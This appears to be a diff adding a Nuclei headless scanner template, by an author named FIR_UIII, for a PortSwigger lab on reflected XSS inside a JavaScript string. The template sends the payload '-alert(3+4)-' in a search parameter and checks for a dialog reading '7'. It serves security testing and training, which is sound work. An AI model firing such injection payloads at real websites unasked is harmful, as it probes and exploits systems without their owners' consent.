@@ -1,0 +1,28 @@
+# run with flag $ nuclei -headless
+
+id: lab-javascript-string-angle-brackets-html-encoded
+
+info:
+  name: xss_lab-javascript-string-angle-brackets-html-encoded
+  author: FIR_UIII
+  severity: high
+  description: XSS injection attack
+  reference:
+    - https://
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?search=%27-alert%283%2B4%29-%27"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "7" # 3+4
+        condition: and
